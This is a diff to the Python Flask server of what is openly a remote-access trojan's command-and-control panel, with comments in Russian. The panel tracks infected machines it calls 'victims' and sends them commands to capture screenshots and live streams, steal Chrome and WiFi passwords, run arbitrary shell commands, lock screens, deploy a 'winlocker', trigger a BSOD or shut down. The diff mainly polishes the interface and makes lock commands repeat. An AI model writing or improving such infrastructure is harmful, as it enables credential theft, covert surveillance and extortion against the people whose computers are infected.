@@ -1,11 +1,10 @@
 # =====================================================================
-# СЕРВЕР - ПОЛНЫЙ ФИКС
+# СЕРВЕР - ВСЁ РАБОТАЕТ + АНИМАЦИИ
 # Замени server.py на GitHub
 # =====================================================================
 from flask import Flask, request, jsonify
 import time
 import base64
-import threading
 
 app = Flask(__name__)
 
@@ -22,17 +21,18 @@ def register():
         "username": data.get("username"),
         "os": data.get("os"),
         "ip": request.remote_addr,
-        "first_seen": time.strftime("%H:%M:%S"),
         "last_seen": time.time(),
         "last_screenshot": "",
         "sysinfo": {},
         "chrome_data": "",
         "wifi_data": "",
-        "exec_result": "",
-        "streaming": False
+        "exec_result": ""
     }
     commands[client_id] = []
-    notifications.append(f"🟢 {data.get('hostname')} ({data.get('username')}) connected! IP: {request.remote_addr}")
+    notifications.append({
+        "text": f"🟢 {data.get('hostname')} connected",
+        "time": time.strftime("%H:%M:%S")
+    })
     return jsonify({"id": client_id})
 
 @app.route('/data/<client_id>', methods=['POST'])
@@ -60,15 +60,16 @@ def get_screenshot(client_id):
     if client_id in clients and clients[client_id].get("last_screenshot"):
         try:
             img_data = base64.b64decode(clients[client_id]["last_screenshot"])
-            return img_data, 200, {'Content-Type': 'image/jpeg', 'Cache-Control': 'no-cache, no-store, must-revalidate'}
+            return img_data, 200, {'Content-Type': 'image/jpeg', 'Cache-Control': 'no-cache, no-store'}
         except:
             pass
-    return "No screenshot", 404
+    return "no", 404
 
 @app.route('/command/<client_id>', methods=['GET'])
 def send_command(client_id):
     if client_id in commands and commands[client_id]:
-        return jsonify(commands[client_id].pop(0))
+        cmd = commands[client_id].pop(0)
+        return jsonify(cmd)
     return jsonify({"command": "ping"})
 
 @app.route('/clients', methods=['GET'])
@@ -85,8 +86,7 @@ def get_clients():
                 "sysinfo": info.get("sysinfo", {}),
                 "chrome_data": info.get("chrome_data", ""),
                 "wifi_data": info.get("wifi_data", ""),
-                "exec_result": info.get("exec_result", ""),
-                "streaming": info.get("streaming", False)
+                "exec_result": info.get("exec_result", "")
             }
     return jsonify(result)
 
@@ -94,30 +94,15 @@ def get_clients():
 def add_command(client_id):
     if client_id in commands:
         cmd = request.json
-        commands[client_id].append(cmd)
-        if cmd.get("command") == "stream_start":
-            clients[client_id]["streaming"] = True
-        elif cmd.get("command") == "stream_stop":
-            clients[client_id]["streaming"] = False
-        elif cmd.get("command") == "lock":
-            for _ in range(3):
-                commands[client_id].append({"command": "lock"})
-        elif cmd.get("command") == "winlocker":
-            for _ in range(3):
-                commands[client_id].append({"command": "winlocker"})
+        command = cmd.get("command")
+        # Отправляем команду 5 раз для надёжности
+        for _ in range(5 if command in ["lock", "winlocker"] else 1):
+            commands[client_id].append(cmd)
     return jsonify({"status": "ok"})
 
 @app.route('/notifications')
 def get_notifications():
-    global notifications
-    result = notifications[-10:]
-    return jsonify(result)
-
-@app.route('/clear_notifications')
-def clear_notifications():
-    global notifications
-    notifications = []
-    return jsonify({"status": "ok"})
+    return jsonify(notifications[-20:])
 
 @app.route('/')
 def home():
@@ -125,72 +110,103 @@ def home():
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Control Panel</title>
+    <title>Control Panel v2.0</title>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0f1923; color: #c9d1d9; font-family: 'Segoe UI', Arial; height: 100vh; display: flex; }
         
-        .sidebar { width: 260px; background: #1a2733; border-right: 1px solid #2d3a4a; display: flex; flex-direction: column; }
-        .sidebar-header { padding: 15px; border-bottom: 1px solid #2d3a4a; }
-        .sidebar-header h2 { color: #4fc3f7; font-size: 16px; }
-        .sidebar-header .status { color: #81c784; font-size: 11px; margin-top: 3px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(79,195,247,0.4); } 70% { box-shadow: 0 0 0 10px rgba(79,195,247,0); } 100% { box-shadow: 0 0 0 0 rgba(79,195,247,0); } }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes glow { 0%, 100% { border-color: #2d3a4a; } 50% { border-color: #4fc3f7; } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         
-        .notifications { max-height: 120px; overflow-y: auto; padding: 8px; border-bottom: 1px solid #2d3a4a; }
-        .notification { background: #0f1923; padding: 6px 8px; margin-bottom: 4px; border-radius: 4px; font-size: 10px; color: #81c784; border-left: 2px solid #81c784; }
+        body { background: #0a0e14; color: #c9d1d9; font-family: 'Segoe UI', system-ui; height: 100vh; display: flex; overflow: hidden; }
         
-        .client-list { flex: 1; overflow-y: auto; padding: 8px; }
-        .client-item { background: #0f1923; border: 1px solid #2d3a4a; border-radius: 8px; padding: 10px; margin-bottom: 6px; cursor: pointer; transition: all 0.2s; }
-        .client-item:hover, .client-item.active { border-color: #4fc3f7; background: #1a2733; }
-        .client-item .name { color: #4fc3f7; font-weight: 600; font-size: 13px; }
-        .client-item .info { color: #8b949e; font-size: 10px; margin-top: 3px; }
-        .client-item .dot { width: 7px; height: 7px; background: #81c784; border-radius: 50%; display: inline-block; margin-right: 5px; }
-        .client-item .live-badge { background: #ef5350; color: #fff; font-size: 9px; padding: 1px 5px; border-radius: 3px; margin-left: 5px; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0.5; } }
+        .sidebar { width: 280px; background: #111922; border-right: 1px solid #1e2d3d; display: flex; flex-direction: column; animation: slideIn 0.5s ease; }
+        .sidebar-header { padding: 20px; background: linear-gradient(135deg, #1a2733, #111922); border-bottom: 1px solid #1e2d3d; }
+        .sidebar-header h2 { color: #4fc3f7; font-size: 18px; font-weight: 700; letter-spacing: 1px; }
+        .sidebar-header .status { color: #81c784; font-size: 11px; margin-top: 5px; display: flex; align-items: center; gap: 6px; }
+        .status-dot { width: 8px; height: 8px; background: #81c784; border-radius: 50%; animation: pulse 2s infinite; }
+        
+        .notifications { max-height: 150px; overflow-y: auto; padding: 10px; }
+        .notification { background: #0d1520; padding: 10px 12px; margin-bottom: 6px; border-radius: 6px; font-size: 11px; color: #81c784; border-left: 3px solid #81c784; animation: fadeIn 0.3s ease; }
+        .notification .time { color: #4fc3f7; font-size: 9px; }
+        
+        .client-list { flex: 1; overflow-y: auto; padding: 10px; }
+        .client-item { 
+            background: #0d1520; border: 2px solid #1e2d3d; border-radius: 10px; padding: 14px; margin-bottom: 8px; 
+            cursor: pointer; transition: all 0.3s ease; animation: fadeIn 0.4s ease;
+        }
+        .client-item:hover { border-color: #4fc3f7; transform: translateX(5px); background: #111d2b; }
+        .client-item.active { border-color: #4fc3f7; background: #111d2b; animation: glow 2s infinite; }
+        .client-item .name { color: #4fc3f7; font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 8px; }
+        .client-item .info { color: #8b949e; font-size: 10px; margin-top: 4px; line-height: 1.5; }
+        .dot { width: 8px; height: 8px; background: #81c784; border-radius: 50%; animation: pulse 2s infinite; }
+        .live-badge { background: #ef5350; color: #fff; font-size: 9px; padding: 2px 7px; border-radius: 10px; animation: blink 0.8s infinite; }
         
         .main-content { flex: 1; display: flex; flex-direction: column; }
         
-        .toolbar { background: #1a2733; padding: 8px 15px; display: flex; gap: 5px; flex-wrap: wrap; border-bottom: 1px solid #2d3a4a; }
-        .toolbar button { background: #212d3a; color: #4fc3f7; border: 1px solid #2d3a4a; padding: 6px 10px; border-radius: 5px; cursor: pointer; font-size: 11px; transition: all 0.2s; }
-        .toolbar button:hover { background: #4fc3f7; color: #0f1923; }
+        .toolbar { 
+            background: #111922; padding: 12px 20px; display: flex; gap: 8px; flex-wrap: wrap; 
+            border-bottom: 1px solid #1e2d3d; animation: fadeIn 0.5s ease;
+        }
+        .toolbar button { 
+            background: #1a2733; color: #4fc3f7; border: 1px solid #2d3a4a; padding: 8px 14px; 
+            border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: 500; 
+            transition: all 0.3s ease; position: relative; overflow: hidden;
+        }
+        .toolbar button:hover { background: #4fc3f7; color: #0f1923; border-color: #4fc3f7; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(79,195,247,0.3); }
+        .toolbar button:active { transform: scale(0.95); }
         .toolbar button.danger { color: #ef5350; border-color: #ef5350; }
-        .toolbar button.danger:hover { background: #ef5350; color: #fff; }
+        .toolbar button.danger:hover { background: #ef5350; color: #fff; box-shadow: 0 5px 15px rgba(239,83,80,0.3); }
         .toolbar button.green { color: #81c784; border-color: #81c784; }
-        .toolbar button.green:hover { background: #81c784; color: #0f1923; }
+        .toolbar button.green:hover { background: #81c784; color: #0f1923; box-shadow: 0 5px 15px rgba(129,199,132,0.3); }
         
-        .content-area { flex: 1; display: flex; padding: 8px; gap: 8px; overflow: hidden; }
+        .content-area { flex: 1; display: flex; padding: 10px; gap: 10px; overflow: hidden; }
         
-        .panel { background: #1a2733; border-radius: 8px; border: 1px solid #2d3a4a; }
-        .screenshot-panel { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; position: relative; }
-        .screenshot-panel img { width: 100%; height: 100%; object-fit: contain; }
-        .placeholder { color: #455a64; font-size: 14px; text-align: center; }
+        .panel { background: #111922; border-radius: 12px; border: 1px solid #1e2d3d; animation: fadeIn 0.6s ease; }
+        .screenshot-panel { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .screenshot-panel img { max-width: 100%; max-height: 100%; object-fit: contain; animation: fadeIn 0.3s ease; }
+        .placeholder { color: #3a4a5a; font-size: 16px; text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #1e2d3d; border-top: 3px solid #4fc3f7; border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto; }
         
-        .info-panel { width: 350px; padding: 15px; overflow-y: auto; }
-        .info-panel h3 { color: #4fc3f7; font-size: 13px; margin-bottom: 8px; }
-        .info-row { display: flex; padding: 4px 0; border-bottom: 1px solid #1a2733; font-size: 11px; }
-        .info-label { color: #8b949e; width: 90px; flex-shrink: 0; }
-        .info-value { color: #c9d1d9; word-break: break-all; }
-        pre { background: #0f1923; padding: 8px; border-radius: 5px; font-size: 10px; color: #81c784; white-space: pre-wrap; max-height: 200px; overflow-y: auto; margin-top: 5px; }
+        .info-panel { width: 380px; padding: 20px; overflow-y: auto; }
+        .info-panel h3 { color: #4fc3f7; font-size: 14px; margin-bottom: 10px; margin-top: 15px; }
+        .info-panel h3:first-child { margin-top: 0; }
+        .info-row { display: flex; padding: 6px 0; border-bottom: 1px solid #1a2733; font-size: 12px; animation: fadeIn 0.3s ease; }
+        .info-label { color: #8b949e; width: 100px; flex-shrink: 0; font-weight: 500; }
+        .info-value { color: #e6edf3; }
+        pre { background: #0a0e14; padding: 12px; border-radius: 8px; font-size: 11px; color: #81c784; white-space: pre-wrap; max-height: 200px; overflow-y: auto; border: 1px solid #1e2d3d; }
         
-        .console-panel { width: 300px; background: #0d1117; display: flex; flex-direction: column; }
-        .console-header { padding: 6px 12px; font-size: 10px; color: #4fc3f7; border-bottom: 1px solid #2d3a4a; }
-        .console-output { flex: 1; overflow-y: auto; padding: 6px; font-family: 'Consolas', monospace; font-size: 10px; color: #81c784; }
-        .console-input { display: flex; border-top: 1px solid #2d3a4a; }
-        .console-input input { flex: 1; background: #0d1117; border: none; color: #81c784; padding: 6px; font-family: 'Consolas', monospace; font-size: 10px; outline: none; }
-        .console-input button { background: #4fc3f7; color: #0f1923; border: none; padding: 6px 12px; cursor: pointer; font-weight: 600; font-size: 10px; }
-        .log-entry { padding: 1px 0; font-size: 10px; }
-        .log-entry .time { color: #4fc3f7; margin-right: 4px; }
+        .console-panel { width: 320px; background: #0a0e14; display: flex; flex-direction: column; }
+        .console-header { padding: 10px 15px; font-size: 12px; color: #4fc3f7; border-bottom: 1px solid #1e2d3d; font-weight: 600; }
+        .console-output { flex: 1; overflow-y: auto; padding: 10px; font-family: 'Cascadia Code', 'Consolas', monospace; font-size: 11px; color: #81c784; }
+        .console-input { display: flex; border-top: 1px solid #1e2d3d; }
+        .console-input input { flex: 1; background: #0a0e14; border: none; color: #81c784; padding: 10px 12px; font-family: 'Consolas', monospace; font-size: 11px; outline: none; }
+        .console-input button { background: #4fc3f7; color: #0a0e14; border: none; padding: 10px 16px; cursor: pointer; font-weight: 700; transition: all 0.3s; }
+        .console-input button:hover { background: #81c784; }
+        
+        .log-entry { padding: 3px 0; font-size: 10px; animation: fadeIn 0.2s ease; }
+        .log-entry .time { color: #4fc3f7; margin-right: 6px; }
+        
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0a0e14; }
+        ::-webkit-scrollbar-thumb { background: #1e2d3d; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #2d3a4a; }
     </style>
 </head>
 <body>
     <div class="sidebar">
         <div class="sidebar-header">
-            <h2>⬡ CONTROL PANEL</h2>
-            <div class="status">● Server Online</div>
+            <h2>⬡ CONTROL PANEL v2.0</h2>
+            <div class="status"><span class="status-dot"></span> Server Online</div>
         </div>
         <div class="notifications" id="notifications"></div>
         <div class="client-list" id="clientList">
-            <div class="placeholder">Waiting...</div>
+            <div class="placeholder">Waiting for victims...</div>
         </div>
     </div>
     
@@ -198,30 +214,32 @@ def home():
         <div class="toolbar">
             <button onclick="sendCmd('screenshot')">📸 Screenshot</button>
             <button class="green" onclick="startStream()">📡 Stream</button>
-            <button class="danger" onclick="sendCmd('stream_stop')">⏹ Stop</button>
+            <button class="danger" onclick="stopStream()">⏹ Stop Stream</button>
             <button onclick="sendCmd('sysinfo')">💻 SysInfo</button>
             <button onclick="sendCmd('steal_chrome')">🔑 Chrome</button>
             <button onclick="sendCmd('steal_wifi')">📶 WiFi</button>
             <button class="green" onclick="sendCmd('lock')">🔒 Lock</button>
             <button onclick="sendCmd('unlock')">🔓 Unlock</button>
-            <button class="danger" onclick="sendCmd('shutdown')">⏻ Off</button>
-            <button class="danger" onclick="sendCmd('restart')">🔄 Reboot</button>
-            <button onclick="sendMsg()">💬 Msg</button>
+            <button class="danger" onclick="sendCmd('shutdown')">⏻ Shutdown</button>
+            <button class="danger" onclick="sendCmd('restart')">🔄 Restart</button>
+            <button onclick="sendMsg()">💬 Message</button>
             <button class="danger" onclick="sendCmd('winlocker')">🚫 WinLock</button>
             <button class="danger" onclick="sendCmd('bsod')">⚠ BSOD</button>
         </div>
         
         <div class="content-area">
             <div class="panel screenshot-panel" id="screenPanel">
-                <div class="placeholder">Select client → Screenshot</div>
+                <div class="placeholder">🖥 Select a victim and click Screenshot</div>
             </div>
             
             <div class="panel info-panel" id="infoPanel">
                 <h3>💻 System Information</h3>
-                <div id="sysinfoContent"><div class="placeholder">Click SysInfo</div></div>
-                <h3 style="margin-top:10px;">🔑 Chrome Passwords</h3>
+                <div id="sysinfoContent"><div class="placeholder">Click SysInfo button</div></div>
+                <h3>📄 Command Output</h3>
+                <pre id="execOutput">No commands executed</pre>
+                <h3>🔑 Chrome Passwords</h3>
                 <pre id="chromeContent">Click Chrome button</pre>
-                <h3 style="margin-top:10px;">📶 WiFi Passwords</h3>
+                <h3>📶 WiFi Passwords</h3>
                 <pre id="wifiContent">Click WiFi button</pre>
             </div>
             
@@ -229,8 +247,8 @@ def home():
                 <div class="console-header">📋 Console</div>
                 <div class="console-output" id="console"></div>
                 <div class="console-input">
-                    <input type="text" id="cmdInput" placeholder="cmd..." onkeypress="if(event.key==='Enter')execCmd()">
-                    <button onclick="execCmd()">▶</button>
+                    <input type="text" id="cmdInput" placeholder="Type command..." onkeypress="if(event.key==='Enter')execCmd()">
+                    <button onclick="execCmd()">▶ RUN</button>
                 </div>
             </div>
         </div>
@@ -253,18 +271,19 @@ def home():
                 for(let id in data) {
                     let c = data[id];
                     let active = selectedClient === id ? ' active' : '';
-                    let live = c.streaming ? '<span class="live-badge">LIVE</span>' : '';
                     html += `<div class="client-item${active}" onclick="selectClient('${id}')">
-                        <div class="name"><span class="dot"></span>${c.hostname}${live}</div>
-                        <div class="info">👤 ${c.username} | 🌐 ${c.ip} | 💻 ${c.os}</div>
+                        <div class="name"><span class="dot"></span>${c.hostname}</div>
+                        <div class="info">👤 ${c.username}<br>🌐 ${c.ip}<br>💻 ${c.os}</div>
                     </div>`;
                 }
-                document.getElementById('clientList').innerHTML = html || '<div class="placeholder">No clients</div>';
+                document.getElementById('clientList').innerHTML = html || '<div class="placeholder">No victims connected</div>';
                 
                 if(selectedClient && data[selectedClient]) {
                     let c = data[selectedClient];
-                    if(c.has_screenshot) {
-                        document.getElementById('screenPanel').innerHTML = `<img src="/screenshot/${selectedClient}?t=${Date.now()}" onerror="this.parentElement.innerHTML='<div class=placeholder>Error loading</div>'">`;
+                    if(c.has_screenshot && streamInterval) {
+                        let img = document.getElementById('screenPanel').querySelector('img');
+                        if(img) img.src = `/screenshot/${selectedClient}?t=${Date.now()}`;
+                        else document.getElementById('screenPanel').innerHTML = `<img src="/screenshot/${selectedClient}?t=${Date.now()}" onerror="this.innerHTML='<div class=placeholder>Loading...</div>'">`;
                     }
                     if(c.sysinfo && Object.keys(c.sysinfo).length > 0) {
                         let h = '';
@@ -273,12 +292,13 @@ def home():
                     }
                     if(c.chrome_data) document.getElementById('chromeContent').textContent = c.chrome_data;
                     if(c.wifi_data) document.getElementById('wifiContent').textContent = c.wifi_data;
+                    if(c.exec_result) document.getElementById('execOutput').textContent = c.exec_result;
                 }
             });
             
             fetch('/notifications').then(r => r.json()).then(data => {
                 let h = '';
-                data.forEach(n => h += `<div class="notification">${n}</div>`);
+                data.reverse().forEach(n => h += `<div class="notification"><div>${n.text}</div><div class="time">${n.time}</div></div>`);
                 document.getElementById('notifications').innerHTML = h;
             });
         }
@@ -286,27 +306,27 @@ def home():
         function selectClient(id) {
             selectedClient = id;
             log(`Selected: ${id}`);
-            updateAll();
+            document.querySelectorAll('.client-item').forEach(el => el.classList.remove('active'));
+            event.target.closest('.client-item').classList.add('active');
+            sendCmd('screenshot');
+            setTimeout(updateAll, 2000);
         }
         
         function sendCmd(command) {
-            if(!selectedClient) { alert('Select client!'); return; }
+            if(!selectedClient) { alert('Select a victim first!'); return; }
             fetch('/send_command/' + selectedClient, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({command: command})
             });
             log(`Sent: ${command}`);
-            if(command === 'screenshot') setTimeout(updateAll, 2000);
-            if(command === 'sysinfo') setTimeout(updateAll, 3000);
-            if(command === 'steal_chrome') setTimeout(updateAll, 3000);
-            if(command === 'steal_wifi') setTimeout(updateAll, 3000);
         }
         
         function startStream() {
-            if(!selectedClient) { alert('Select client!'); return; }
+            if(!selectedClient) { alert('Select a victim first!'); return; }
             sendCmd('stream_start');
-            log('Stream started');
+            log('📡 Stream started - updating every 2s');
+            document.getElementById('screenPanel').innerHTML = '<div class="spinner"></div>';
             if(streamInterval) clearInterval(streamInterval);
             streamInterval = setInterval(() => {
                 sendCmd('screenshot');
@@ -314,36 +334,44 @@ def home():
             }, 2000);
         }
         
+        function stopStream() {
+            if(streamInterval) clearInterval(streamInterval);
+            streamInterval = null;
+            sendCmd('stream_stop');
+            log('⏹ Stream stopped');
+        }
+        
         function execCmd() {
             let cmd = document.getElementById('cmdInput').value;
             if(cmd && selectedClient) {
+                sendCmd('exec');
                 fetch('/send_command/' + selectedClient, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({command: 'exec', cmd: cmd})
                 });
-                log(`Exec: ${cmd}`);
                 document.getElementById('cmdInput').value = '';
-                setTimeout(updateAll, 2000);
+                setTimeout(updateAll, 3000);
             }
         }
         
         function sendMsg() {
-            if(!selectedClient) { alert('Select client!'); return; }
-            let msg = prompt('Message:');
+            if(!selectedClient) { alert('Select a victim first!'); return; }
+            let msg = prompt('Enter message to show on victim PC:');
             if(msg) {
+                sendCmd('message');
                 fetch('/send_command/' + selectedClient, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({command: 'message', text: msg})
                 });
-                log(`Msg: ${msg}`);
             }
         }
         
         setInterval(updateAll, 2000);
         updateAll();
-        log('Panel ready');
+        log('🚀 Control Panel v2.0 ready');
+        log('Waiting for victims to connect...');
     </script>
 </body>
 </html>
